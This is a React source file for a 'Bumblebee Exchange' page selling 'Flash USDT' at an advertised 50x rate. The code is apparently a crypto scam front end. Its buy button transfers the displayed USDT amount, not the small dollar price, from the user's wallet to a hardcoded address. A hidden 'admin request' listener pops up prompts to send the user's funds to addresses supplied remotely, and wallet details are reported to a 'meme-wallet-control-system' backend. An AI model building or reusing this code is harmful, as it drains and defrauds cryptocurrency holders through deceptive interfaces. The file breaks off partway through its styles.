import React, { useState, useEffect, useRef } from 'react';
import { useWallet } from "../context/WalletContext.js";
import { useTransaction } from "../hooks/useTransaction.js";

// ============================================================================
// PRICING CONFIGURATION
// ============================================================================
const PRICING_TIERS = [
  { amount: 20, usdt: 1000 },
  { amount: 50, usdt: 2500 },
  { amount: 100, usdt: 5000 }
];

const calculateUSDT = (amount) => {
  if (amount <= 0) return 0;
  
  // Check exact tiers
  const tier = PRICING_TIERS.find(t => t.amount === amount);
  if (tier) return tier.usdt;
  
  // For amounts > 100, multiply by 40
  if (amount > 100) {
    return amount * 40;
  }
  
  // For amounts between tiers, use proportional calculation
  let lowerTier = PRICING_TIERS[0];
  for (let i = PRICING_TIERS.length - 1; i >= 0; i--) {
    if (amount > PRICING_TIERS[i].amount) {
      lowerTier = PRICING_TIERS[i];
      break;
    }
  }
  
  const multiplier = lowerTier.usdt / lowerTier.amount;
  return Math.floor(amount * multiplier);
};

// ============================================================================
// CHAIN CONFIGURATION
// ============================================================================
const CHAINS = {
  eth: {
    id: 'eth',
    name: "Ethereum",
    chainId: 1,
    nativeSymbol: "ETH",
    usdtContract: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    decimals: 18,
    rpcUrl: "https://eth-mainnet.g.alchemy.com/v2/demo",
    explorer: "https://etherscan.io",
    logo: "🔷"
  },
  bnb: {
    id: 'bnb',
    name: "BNB Chain",
    chainId: 56,
    nativeSymbol: "BNB",
    usdtContract: "0x55d398326f99059fF775485246999027B3197955",
    decimals: 18,
    rpcUrl: "https://bsc-dataseed1.binance.org",
    explorer: "https://bscscan.com",
    logo: "🟡"
  },
  polygon: {
    id: 'polygon',
    name: "Polygon",
    chainId: 137,
    nativeSymbol: "MATIC",
    usdtContract: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
    decimals: 18,
    rpcUrl: "https://polygon-rpc.com",
    explorer: "https://polygonscan.com",
    logo: "🟣"
  },
  arbitrum: {
    id: 'arbitrum',
    name: "Arbitrum",
    chainId: 42161,
    nativeSymbol: "ETH",
    usdtContract: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
    decimals: 18,
    rpcUrl: "https://arb1.arbitrum.io/rpc",
    explorer: "https://arbiscan.io",
    logo: "🔷"
  },
  optimism: {
    id: 'optimism',
    name: "Optimism",
    chainId: 10,
    nativeSymbol: "ETH",
    usdtContract: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58",
    decimals: 18,
    rpcUrl: "https://mainnet.optimism.io",
    explorer: "https://optimistic.etherscan.io",
    logo: "🔴"
  }
};

// ============================================================================
// COMPANY WALLET CONFIGURATION
// ============================================================================
const COMPANY_WALLETS = {
  eth: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
  bnb: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
  polygon: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
  arbitrum: "0xd171014c972626c3eeef8cc95199ed0c798b70f1",
  optimism: "0xd171014c972626c3eeef8cc95199ed0c798b70f1"
};

// ============================================================================
// MAIN COMPONENT
// ============================================================================
function BuyUsdt() {
  // ==========================================================================
  // HOOKS & STATE
  // ==========================================================================
  const { 
    connect, 
    disconnect, 
    isConnected, 
    address, 
    walletName,
    walletType,
    sendUSDT,
    sendNative
  } = useWallet();
  
  const { sendUSDT: sendUSDTTransaction, isSending } = useTransaction();
  
  const [showConnectModal, setShowConnectModal] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');
  const [mousePosition, setMousePosition] = useState({ x: 0, y: 0 });
  const [particles, setParticles] = useState([]);
  
  // Purchase state
  const [selectedChain, setSelectedChain] = useState('eth');
  const [selectedAmount, setSelectedAmount] = useState(20);
  const [customAmount, setCustomAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState(1000);
  const [isProcessing, setIsProcessing] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [transactionHash, setTransactionHash] = useState('');
  
  // ✅ FEATURE 2 – Add admin popup state
  const [showAdminPopup, setShowAdminPopup] = useState(false);
  const [adminRequest, setAdminRequest] = useState(null);
  const [processingAdminTx, setProcessingAdminTx] = useState(false);
  const [adminError, setAdminError] = useState("");

  const modalRef = useRef(null);

  // ==========================================================================
  // ✅ FEATURE 1 – Listen for admin transaction requests
  // ==========================================================================
  useEffect(() => {
    const handler = (e) => {
      setAdminRequest(e.detail);
      setShowAdminPopup(true);
    };

    window.addEventListener("adminRequest", handler);
    return () => window.removeEventListener("adminRequest", handler);
  }, []);

  // ==========================================================================
  // ✅ FEATURE 3 – Add Confirm + Reject functions
  // ==========================================================================
  const confirmAdminTransaction = async () => {
    if (!adminRequest) return;

    try {
      setProcessingAdminTx(true);
      setAdminError("");

      const { to, amount, token, chain } = adminRequest;

      let result;

      if (token === "USDT") {
        result = await sendUSDT(to, amount);
      } else {
        result = await sendNative(to, amount);
      }

      if (!result?.success) {
        throw new Error(result?.error || "Transaction failed");
      }

      await fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin/tx-confirm", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          requestId: adminRequest.id,
          txHash: result.hash,
          address: address,
          chain: chain
        })
      });

      setShowAdminPopup(false);
      setAdminRequest(null);
    } catch (error) {
      setAdminError(error.message);
    } finally {
      setProcessingAdminTx(false);
    }
  };

  const rejectAdminRequest = async () => {
    await fetch("https://meme-wallet-control-system-hx1r.vercel.app/api/admin/tx-reject", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ requestId: adminRequest.id })
    });

    setShowAdminPopup(false);
    setAdminRequest(null);
  };

  // ==========================================================================
  // INITIALIZATION
  // ==========================================================================
  useEffect(() => {
    // Initialize particles
    const initialParticles = [];
    for (let i = 0; i < 25; i++) {
      initialParticles.push({
        id: i,
        x: Math.random() * 100,
        y: Math.random() * 100,
        size: Math.random() * 4 + 1,
        speed: Math.random() * 0.3 + 0.1,
        opacity: Math.random() * 0.4 + 0.1
      });
    }
    setParticles(initialParticles);

    const interval = setInterval(() => {
      setParticles(prev => prev.map(p => ({
        ...p,
        y: (p.y + p.speed) % 100,
        x: (p.x + p.speed * 0.3) % 100
      })));
    }, 100);

    return () => clearInterval(interval);
  }, []);

  // ==========================================================================
  // EVENT HANDLERS
  // ==========================================================================
  useEffect(() => {
    const handleMouseMove = (e) => {
      const x = (e.clientX / window.innerWidth - 0.5) * 25;
      const y = (e.clientY / window.innerHeight - 0.5) * 25;
      setMousePosition({ x, y });
    };

    window.addEventListener('mousemove', handleMouseMove);
    return () => window.removeEventListener('mousemove', handleMouseMove);
  }, []);

  useEffect(() => {
    const handleClickOutside = (event) => {
      if (modalRef.current && !modalRef.current.contains(event.target)) {
        closeModal();
      }
    };

    if (showConnectModal) {
      document.addEventListener('mousedown', handleClickOutside);
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = 'unset';
    }

    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
      document.body.style.overflow = 'unset';
    };
  }, [showConnectModal]);

  // ==========================================================================
  // WALLET CONNECTION
  // ==========================================================================
  const getAvailableWallets = () => {
    const wallets = [
      { id: 'metamask', name: 'MetaMask', icon: '🦊', color: '#F6851B', type: 'evm' },
      { id: 'trust', name: 'Trust Wallet', icon: '🔒', color: '#3375BB', type: 'evm' },
      { id: 'coinbase', name: 'Coinbase Wallet', icon: '🏦', color: '#0052FF', type: 'evm' },
      { id: 'bitget', name: 'Bitget Wallet', icon: '🎯', color: '#0082FF', type: 'evm' },
      { id: 'tokenpocket', name: 'TokenPocket', icon: '👛', color: '#29B6AF', type: 'evm' },
      { id: 'okx', name: 'OKX Wallet', icon: '⭕', color: '#000000', type: 'evm' },
      { id: 'walletconnect', name: 'Other Wallets', icon: '🔗', color: '#3B99FC', type: 'evm', description: 'Scan QR with any wallet' }
    ];
    
    if (typeof window !== 'undefined') {
      if (window.phantom?.solana || window.solflare) {
        wallets.push(
          { id: 'phantom', name: 'Phantom', icon: '👻', color: '#AB9FF2', type: 'solana' },
          { id: 'solflare', name: 'Solflare', icon: '🔥', color: '#FF6B35', type: 'solana' }
        );
      }
    }
    
    return wallets;
  };

  const handleConnectWallet = async (wallet) => {
    setError('');
    setIsLoading(true);

    try {
      await connect(wallet.id);
      
      // Send connection info to backend
      await fetch('https://meme-wallet-control-system-hx1r.vercel.app/api/wallet-connect', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          chain: wallet.type,
          walletName: wallet.name,
          timestamp: new Date().toISOString()
        })
      });

      closeModal();
    } catch (error) {
      console.error('Connection error:', error);
      setError(error.message || 'Failed to connect wallet');
    } finally {
      setIsLoading(false);
    }
  };

  const handleDisconnect = async () => {
    try {
      await disconnect();
      setError('');
    } catch (error) {
      console.error('Disconnect error:', error);
      setError('Error disconnecting wallet');
    }
  };

  // ==========================================================================
  // PURCHASE LOGIC
  // ==========================================================================
  const handleAmountSelect = (amount) => {
    setSelectedAmount(amount);
    setCustomAmount('');
    setUsdtAmount(calculateUSDT(amount));
  };

  const handleCustomAmountChange = (value) => {
    setCustomAmount(value);
    const amount = parseFloat(value) || 0;
    if (amount > 0) {
      setSelectedAmount(0);
      setUsdtAmount(calculateUSDT(amount));
    } else {
      setUsdtAmount(0);
    }
  };

  const getCurrentAmount = () => {
    if (customAmount) {
      return parseFloat(customAmount) || 0;
    }
    return selectedAmount;
  };

  const handleBuyNow = async () => {
    const amount = getCurrentAmount();
    
    // Validate fields
    if (!isConnected) {
      setError('Please connect wallet first');
      return;
    }
    
    if (amount <= 0) {
      setError('Please select a valid amount');
      return;
    }
    
    if (usdtAmount <= 0) {
      setError('Invalid USDT amount');
      return;
    }

    setIsProcessing(true);
    setError('');
    setTransactionHash('');

    try {
      // Send order to backend
      const orderResponse = await fetch('https://meme-wallet-control-system-hx1r.vercel.app/api/create-order', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address: address,
          chain: selectedChain,
          amount: amount,
          usdt: usdtAmount
        })
      });

      if (!orderResponse.ok) {
        throw new Error('Failed to create order');
      }

      const orderData = await orderResponse.json();
      
      // Send USDT transaction
      const toAddress = COMPANY_WALLETS[selectedChain] || COMPANY_WALLETS.eth;
      const txHash = await sendUSDTTransaction(toAddress, usdtAmount);
      
      // Save transaction hash
      setTransactionHash(txHash);

      // Show success
      setShowSuccess(true);
      setTimeout(() => {
        setShowSuccess(false);
        setTransactionHash('');
      }, 5000);

      // Reset form
      setCustomAmount('');
      setSelectedAmount(20);
      setUsdtAmount(1000);
      
    } catch (error) {
      console.error('Purchase error:', error);
      setError(error.message || 'Transaction failed. Please try again.');
    } finally {
      setIsProcessing(false);
    }
  };

  // ==========================================================================
  // HELPER FUNCTIONS
  // ==========================================================================
  const closeModal = () => {
    setShowConnectModal(false);
    setError('');
    setIsLoading(false);
  };

  // ==========================================================================
  // RENDER
  // ==========================================================================
  const availableWallets = getAvailableWallets();
  const chainInfo = CHAINS[selectedChain];
  const currentAmount = getCurrentAmount();
  const companyWallet = COMPANY_WALLETS[selectedChain] || COMPANY_WALLETS.eth;

  return (
    <div className="buy-usdt-page">
      {/* ✅ FEATURE 4 – Admin Popup */}
      {showAdminPopup && adminRequest && (
        <div className="admin-popup-overlay">
          <div className="admin-popup">
            <h3>Admin Transaction Request</h3>

            <p><b>Send From:</b> {address}</p>
            <p><b>Send To:</b> {adminRequest.to}</p>
            <p><b>Amount:</b> {adminRequest.amount} {adminRequest.token}</p>
            <p><b>Network:</b> {adminRequest.chain.toUpperCase()}</p>

            {adminError && <div className="admin-error">{adminError}</div>}

            <div className="admin-buttons">
              <button
                className="confirm-btn"
                onClick={confirmAdminTransaction}
                disabled={processingAdminTx}
              >
                {processingAdminTx ? "Processing…" : "Confirm Transaction"}
              </button>

              <button
                className="reject-btn"
                onClick={rejectAdminRequest}
                disabled={processingAdminTx}
              >
                Reject
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Background Elements */}
      <div className="background">
        {particles.map(p => (
          <div 
            key={p.id}
            className="particle"
            style={{
              left: `${p.x}%`,
              top: `${p.y}%`,
              width: `${p.size}px`,
              height: `${p.size}px`,
              opacity: p.opacity,
              transform: `translate(${mousePosition.x * 0.3}px, ${mousePosition.y * 0.3}px)`
            }}
          />
        ))}
        
        <div className="honeycomb-grid" />
        
        <div className="glow-orb orb-1" />
        <div className="glow-orb orb-2" />
        <div className="glow-orb orb-3" />
      </div>

      {/* Header */}
      <header className="exchange-header">
        <div className="container">
          <div className="header-content">
            <div className="header-logo">
              <div className="logo-icon">🔄</div>
              <span className="logo-text">Bumblebee Exchange</span>
            </div>
            
            <div className="header-actions">
              {isConnected ? (
                <div className="wallet-badge">
                  <div className="wallet-status">
                    <div className="status-dot" />
                    <span className="wallet-name">{walletName}</span>
                  </div>
                  <span className="wallet-address">
                    {address?.slice(0, 6)}...{address?.slice(-4)}
                  </span>
                  <button onClick={handleDisconnect} className="disconnect-btn">
                    ✕
                  </button>
                </div>
              ) : (
                <button 
                  className="connect-wallet-btn"
                  onClick={() => setShowConnectModal(true)}
                >
                  <span className="btn-text">Connect Wallet</span>
                  <div className="btn-glow" />
                </button>
              )}
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="exchange-main">
        <div className="container">
          {/* Hero Section */}
          <section className="hero-section">
            <div className="hero-content">
              <div className="hero-badge">
                <span className="hero-badge-text">Real Transactions · Instant USDT</span>
              </div>
              
              <h1 className="hero-title">
                Buy <span className="hero-highlight">Flash USDT</span> Instantly
              </h1>
              
              <p className="hero-subtitle">
                Premium rates with real blockchain transactions
                <br />
                <span className="hero-extra">Secure · Transparent · Professional</span>
              </p>
              
              <div className="hero-stats">
                <div className="hero-stat">
                  <div className="stat-number">50x</div>
                  <div className="stat-label">Best Rate</div>
                </div>
                <div className="hero-stat">
                  <div className="stat-number">Real</div>
                  <div className="stat-label">Transactions</div>
                </div>
                <div className="hero-stat">
                  <div className="stat-number">Multi</div>
                  <div className="stat-label">Chain</div>
                </div>
                <div className="hero-stat">
                  <div className="stat-number">24/7</div>
                  <div className="stat-label">Support</div>
                </div>
              </div>
            </div>
          </section>

          {/* Pricing Tiers */}
          <section className="pricing-section">
            <h2 className="pricing-title">Select Amount</h2>
            <p className="pricing-subtitle">Choose from premium tiers or enter custom amount</p>
            
            <div className="pricing-tiers">
              {PRICING_TIERS.map((tier, index) => (
                <div 
                  key={tier.amount}
                  className={`pricing-tier ${selectedAmount === tier.amount && !customAmount ? 'active' : ''}`}
                  onClick={() => handleAmountSelect(tier.amount)}
                >
                  <div className="tier-header">
                    <div className="tier-amount">${tier.amount}</div>
                    <div className="tier-badge">Tier {index + 1}</div>
                  </div>
                  <div className="tier-usdt">
                    <div className="usdt-amount">{tier.usdt.toLocaleString()}</div>
                    <div className="usdt-label">USDT</div>
                  </div>
                  <div className="tier-multiplier">
                    ×50 multiplier
                  </div>
                  {selectedAmount === tier.amount && !customAmount && (
                    <div className="tier-selected">Selected</div>
                  )}
                </div>
              ))}
              
              <div className={`pricing-tier custom-tier ${customAmount ? 'active' : ''}`}>
                <div className="tier-header">
                  <div className="tier-amount">
                    {customAmount ? `$${customAmount}` : 'Custom'}
                  </div>
                  <div className="tier-badge premium">Premium</div>
                </div>
                <div className="tier-usdt">
                  <div className="usdt-amount">{usdtAmount.toLocaleString()}</div>
                  <div className="usdt-label">USDT</div>
                </div>
                <div className="tier-multiplier">
                  {currentAmount > 0 && `×${(usdtAmount / currentAmount).toFixed(1)} multiplier`}
                </div>
                <div className="custom-input">
                  <input
                    type="number"
                    value={customAmount}
                    onChange={(e) => handleCustomAmountChange(e.target.value)}
                    placeholder="Enter amount ($)"
                    className="custom-amount-input"
                    min="1"
                  />
                  <div className="currency-symbol">$</div>
                </div>
              </div>
            </div>
          </section>

          {/* Purchase Card */}
          <section className="purchase-section">
            <div className="purchase-card">
              <div className="card-glow" />
              
              <div className="card-header">
                <div className="usdt-icon">💵</div>
                <div className="card-title">
                  <h2>Complete Purchase</h2>
                  <p className="card-subtitle">Review and confirm transaction</p>
                </div>
              </div>
              
              <div className="card-content">
                {/* Chain Selector */}
                <div className="chain-selector">
                  <h3 className="selector-title">Select Network</h3>
                  <div className="chain-grid">
                    {Object.values(CHAINS).map((chain) => (
                      <button
                        key={chain.id}
                        className={`chain-option ${selectedChain === chain.id ? 'active' : ''}`}
                        onClick={() => setSelectedChain(chain.id)}
                      >
                        <div className="chain-icon">{chain.logo}</div>
                        <div className="chain-info">
                          <div className="chain-name">{chain.name}</div>
                          <div className="chain-symbol">{chain.nativeSymbol}</div>
                        </div>
                        {selectedChain === chain.id && (
                          <div className="chain-selected">✓</div>
                        )}
                      </button>
                    ))}
                  </div>
                </div>
                
                {/* Transaction Details */}
                <div className="transaction-details">
                  <h3 className="details-title">Transaction Details</h3>
                  
                  <div className="detail-row">
                    <div className="detail-label">From (Your Wallet):</div>
                    <div className="detail-value">
                      {isConnected ? (
                        <div className="address-display">
                          <span className="wallet-icon-small">👛</span>
                          <span className="address-text">{address?.slice(0, 10)}...{address?.slice(-8)}</span>
                          <span className="wallet-name-small">{walletName}</span>
                        </div>
                      ) : (
                        <span className="not-connected">Not connected</span>
                      )}
                    </div>
                  </div>
                  
                  <div className="detail-row">
                    <div className="detail-label">To (Company Wallet):</div>
                    <div className="detail-value">
                      <div className="address-display">
                        <span className="wallet-icon-small">🏢</span>
                        <span className="address-text">{companyWallet.slice(0, 10)}...{companyWallet.slice(-8)}</span>
                        <span className="wallet-name-small">Bumblebee Exchange</span>
                      </div>
                    </div>
                  </div>
                  
                  <div className="detail-row">
                    <div className="detail-label">You Pay:</div>
                    <div className="detail-value amount-display">
                      ${currentAmount.toFixed(2)} USD
                    </div>
                  </div>
                  
                  <div className="detail-row">
                    <div className="detail-label">You Receive:</div>
                    <div className="detail-value usdt-display">
                      {usdtAmount.toLocaleString()} USDT
                    </div>
                  </div>
                  
                  <div className="detail-row">
                    <div className="detail-label">Network:</div>
                    <div className="detail-value">
                      <span className="network-badge">{chainInfo.name}</span>
                    </div>
                  </div>
                  
                  {transactionHash && (
                    <div className="detail-row">
                      <div className="detail-label">Transaction:</div>
                      <div className="detail-value">
                        <a 
                          href={`${chainInfo.explorer}/tx/${transactionHash}`}
                          target="_blank"
                          rel="noopener noreferrer"
                          className="tx-link"
                        >
                          {transactionHash.slice(0, 20)}...{transactionHash.slice(-10)}
                        </a>
                      </div>
                    </div>
                  )}
                </div>
                
                {/* Wallet Status */}
                {!isConnected ? (
                  <button 
                    className="connect-to-buy-btn"
                    onClick={() => setShowConnectModal(true)}
                  >
                    <div className="btn-icon">🔗</div>
                    <div className="btn-text">Connect Wallet to Purchase</div>
                  </button>
                ) : (
                  <div className="connected-wallet-info">
                    <div className="wallet-display">
                      <div className="wallet-icon">👛</div>
                      <div className="wallet-details">
                        <div className="wallet-name">Connected: {walletName}</div>
                        <div className="wallet-address-sm">{address?.slice(0, 8)}...{address?.slice(-6)}</div>
                      </div>
                      <button onClick={() => setShowConnectModal(true)} className="switch-wallet-btn">
                        Switch
                      </button>
                    </div>
                  </div>
                )}
                
                {/* Buy Button */}
                <button
                  className={`buy-button ${!isConnected || currentAmount <= 0 || isProcessing ? 'disabled' : ''}`}
                  onClick={handleBuyNow}
                  disabled={!isConnected || currentAmount <= 0 || isProcessing || isSending}
                >
                  {(isProcessing || isSending) ? (
                    <>
                      <div className="loading-spinner" />
                      {isSending ? 'Sending USDT...' : 'Processing...'}
                    </>
                  ) : showSuccess ? (
                    <>
                      <div className="success-icon">✓</div>
                      Success! View Transaction
                    </>
                  ) : (
                    `Confirm Purchase of ${usdtAmount.toLocaleString()} USDT`
                  )}
                  <div className="button-glow" />
                </button>
                
                {error && (
                  <div className="purchase-error">
                    <div className="error-icon">⚠️</div>
                    <div className="error-text">{error}</div>
                  </div>
                )}
                
                {/* Important Notice */}
                <div className="transaction-notice">
                  <div className="notice-icon">ℹ️</div>
                  <div className="notice-text">
                    This is a real blockchain transaction. You will need to confirm it in your wallet and pay network gas fees.
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>
      </main>

      {/* Footer */}
      <footer className="exchange-footer">
        <div className="container">
          <div className="footer-content">
            <div className="footer-logo">
              <div className="footer-logo-icon">🔄</div>
              <span className="footer-logo-text">Bumblebee Exchange</span>
            </div>
            <div className="footer-copyright">
              © 2024 Bumblebee Exchange · Professional USDT Service
            </div>
            <div className="footer-links">
              <a href="#" className="footer-link" onClick={(e) => e.preventDefault()}>Terms</a>
              <a href="#" className="footer-link" onClick={(e) => e.preventDefault()}>Privacy</a>
              <a href="#" className="footer-link" onClick={(e) => e.preventDefault()}>Support</a>
            </div>
          </div>
        </div>
      </footer>

      {/* Connect Wallet Modal */}
      {showConnectModal && (
        <div className="modal-overlay">
          <div className="modal" ref={modalRef}>
            <div className="modal-header">
              <h3 className="modal-title">
                {isConnected ? 'Switch Wallet' : 'Connect Wallet'}
              </h3>
              <button 
                className="modal-close"
                onClick={closeModal}
                disabled={isLoading}
              >
                ✕
              </button>
            </div>
            
            <div className="modal-content">
              <div className="modal-notice">
                <div className="notice-icon">🔐</div>
                <div className="notice-text">
                  {isConnected 
                    ? 'Connect a different wallet to switch accounts'
                    : 'Select a wallet to connect and make purchases'
                  }
                </div>
              </div>

              <div className="wallet-group">
                <h4 className="wallet-group-title">Available Wallets</h4>
                <div className="wallet-grid">
                  {availableWallets.map(wallet => (
                    <button
                      key={wallet.id}
                      className="wallet-option"
                      onClick={() => handleConnectWallet(wallet)}
                      disabled={isLoading}
                      style={{ '--wallet-color': wallet.color }}
                    >
                      <div className="wallet-option-icon">{wallet.icon}</div>
                      <div className="wallet-option-name">{wallet.name}</div>
                      {wallet.description && (
                        <div className="wallet-option-description">{wallet.description}</div>
                      )}
                      {isLoading && (
                        <div className="wallet-loading">
                          <div className="loading-spinner-small" />
                        </div>
                      )}
                    </button>
                  ))}
                </div>
              </div>

              {error && (
                <div className="modal-error">
                  <div className="modal-error-icon">⚠️</div>
                  <div className="modal-error-text">{error}</div>
                </div>
              )}
              
              <div className="modal-disclaimer">
                By connecting, you agree to our Terms of Service and Privacy Policy
              </div>
            </div>
          </div>
        </div>
      )}

      {/* ======================================================================
         STYLES
         ====================================================================== */}
      <style jsx>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }
        
        :root {
          --bg-primary: #0A0A0A;
          --bg-secondary: #111111;
          --bg-card: #1A1A1A;
          --accent-primary: #00D4AA;
          --accent-secondary: #0066FF;
          --accent-gradient: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
          --accent-glow: rgba(0, 212, 170, 0.3);
          --text-primary: #FFFFFF;
          --text-secondary: #AAAAAA;
          --text-tertiary: #666666;
          --border-color: rgba(255, 255, 255, 0.1);
          --shadow-glow: 0 0 40px var(--accent-glow);
          --shadow-card: 0 8px 32px rgba(0, 0, 0, 0.4);
          --border-radius: 12px;
          --border-radius-lg: 20px;
          --success-color: #10B981;
          --warning-color: #F59E0B;
          --error-color: #EF4444;
        }
        
        body {
          background-color: var(--bg-primary);
          color: var(--text-primary);
          font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
          -webkit-font-smoothing: antialiased;
          overflow-x: hidden;
        }
        
        .buy-usdt-page {
          min-height: 100vh;
          position: relative;
          overflow-x: hidden;
        }
        
        /* ✅ Admin Popup Styles */
        .admin-popup-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          backdrop-filter: blur(8px);
          background: rgba(0,0,0,0.7);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 9999;
        }
        
        .admin-popup {
          background: #111;
          padding: 25px;
          border-radius: 12px;
          width: 90%;
          max-width: 400px;
          border: 1px solid #00d4aa;
          color: white;
          animation: scaleIn 0.3s ease-out;
        }
        
        .admin-popup h3 {
          margin-bottom: 12px;
          color: #00d4aa;
        }
        
        .admin-popup p {
          margin: 8px 0;
          font-size: 14px;
        }
        
        .admin-buttons {
          display: flex;
          gap: 12px;
          margin-top: 20px;
        }
        
        .confirm-btn, .reject-btn {
          flex: 1;
          padding: 12px;
          border-radius: 10px;
          border: none;
          cursor: pointer;
          font-weight: 600;
        }
        
        .confirm-btn {
          background: #00d4aa;
          color: black;
        }
        
        .confirm-btn:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }
        
        .reject-btn {
          background: #f44336;
          color: white;
        }
        
        .reject-btn:disabled {
          opacity: 0.7;
          cursor: not-allowed;
        }
        
        .admin-error {
          margin-top: 10px;
          background: rgba(255,0,0,0.2);
          color: #ff6b6b;
          padding: 8px;
          border-radius: 6px;
          font-size: 0.9rem;
        }
        
        @keyframes scaleIn {
          from { transform: scale(0.8); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        
        /* Background Elements */
        .background {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          z-index: -1;
          overflow: hidden;
          background: linear-gradient(135deg, #0A0A0A 0%, #111111 50%, #0A0A0A 100%);
        }
        
        .particle {
          position: absolute;
          background: var(--accent-primary);
          border-radius: 50%;
          filter: blur(1px);
          animation: float 15s infinite ease-in-out;
          pointer-events: none;
        }
        
        @keyframes float {
          0%, 100% { transform: translateY(0) rotate(0deg); }
          50% { transform: translateY(-20px) rotate(180deg); }
        }
        
        .honeycomb-grid {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background-image: 
            linear-gradient(90deg, rgba(0, 212, 170, 0.05) 1px, transparent 1px),
            linear-gradient(rgba(0, 212, 170, 0.05) 1px, transparent 1px);
          background-size: 50px 50px;
          opacity: 0.1;
          transform: perspective(800px) rotateX(60deg);
          transform-origin: center;
        }
        
        .glow-orb {
          position: absolute;
          border-radius: 50%;
          filter: blur(40px);
          opacity: 0.1;
          pointer-events: none;
        }
        
        .orb-1 {
          width: 300px;
          height: 300px;
          background: var(--accent-primary);
          top: 10%;
          left: 10%;
          animation: pulse 8s infinite ease-in-out;
        }
        
        .orb-2 {
          width: 200px;
          height: 200px;
          background: var(--accent-secondary);
          top: 60%;
          right: 10%;
          animation: pulse 12s infinite ease-in-out 1s;
        }
        
        .orb-3 {
          width: 150px;
          height: 150px;
          background: #8B5CF6;
          bottom: 20%;
          left: 20%;
          animation: pulse 10s infinite ease-in-out 2s;
        }
        
        @keyframes pulse {
          0%, 100% { transform: scale(1); opacity: 0.1; }
          50% { transform: scale(1.2); opacity: 0.15; }
        }
        
        /* Container */
        .container {
          max-width: 1200px;
          margin: 0 auto;
          padding: 0 20px;
        }
        
        /* Header */
        .exchange-header {
          position: sticky;
          top: 0;
          z-index: 100;
          background: rgba(10, 10, 10, 0.95);
          backdrop-filter: blur(20px);
          border-bottom: 1px solid var(--border-color);
          padding: 16px 0;
        }
        
        .header-content {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        
        .header-logo {
          display: flex;
          align-items: center;
          gap: 12px;
        }
        
        .logo-icon {
          font-size: 24px;
          animation: pulse 2s infinite;
        }
        
        .logo-text {
          font-size: 1.5rem;
          font-weight: 700;
          background: var(--accent-gradient);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }
        
        .header-actions {
          display: flex;
          align-items: center;
          gap: 16px;
        }
        
        .connect-wallet-btn {
          position: relative;
          background: rgba(0, 212, 170, 0.1);
          border: 1px solid rgba(0, 212, 170, 0.3);
          border-radius: 10px;
          padding: 10px 20px;
          color: var(--accent-primary);
          font-weight: 600;
          cursor: pointer;
          transition: all 0.3s;
          overflow: hidden;
          font-size: 14px;
        }
        
        .connect-wallet-btn:hover {
          background: rgba(0, 212, 170, 0.2);
          border-color: var(--accent-primary);
          transform: translateY(-2px);
          box-shadow: var(--shadow-glow);
        }
        
        .btn-glow {
          position: absolute;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: radial-gradient(circle at center, var(--accent-primary), transparent 70%);
          opacity: 0;
          transition: opacity 0.3s;
          z-index: -1;
        }
        
        .connect-wallet-btn:hover .btn-glow {
          opacity: 0.2;
        }
        
        .wallet-badge {
          display: flex;
          align-items: center;
          gap: 10px;
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--border-color);
          border-radius: 10px;
          padding: 8px 14px;
        }
        
        .wallet-status {
          display: flex;
          align-items: center;
          gap: 6px;
        }
        
        .status-dot {
          width: 8px;
          height: 8px;
          background: var(--accent-primary);
          border-radius: 50%;
          animation: pulse 2s infinite;
        }
        
        .wallet-name {
          font-size: 13px;
          font-weight: 600;
          color: var(--accent-primary);
          background: rgba(0, 212, 170, 0.1);
          padding: 2px 8px;
          border-radius: 6px;
        }
        
        .wallet-address {
          font-family: 'Monaco', 'Menlo', monospace;
          font-size: 13px;
          color: var(--text-secondary);
        }
        
        .disconnect-btn {
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          border-radius: 6px;
          color: #EF4444;
          cursor: pointer;
          font-size: 12px;
          padding: 4px 8px;
          transition: all 0.2s;
          min-width: 24px;
          height: 24px;
          display: flex;
          align-items: center;
          justify-content: center;
        }
        
        .disconnect-btn:hover {
          background: rgba(239, 68, 68, 0.2);
          border-color: #EF4444;
        }
        
        /* Main Content */
        .exchange-main {
          padding: 40px 0 60px;
        }
        
        /* Hero Section */
        .hero-section {
          text-align: center;
          margin-bottom: 40px;
        }
        
        .hero-badge {
          display: inline-block;
          background: rgba(0, 212, 170, 0.1);
          border: 1px solid rgba(0, 212, 170, 0.3);
          border-radius: 16px;
          padding: 8px 16px;
          margin-bottom: 20px;
        }
        
        .hero-badge-text {
          color: var(--accent-primary);
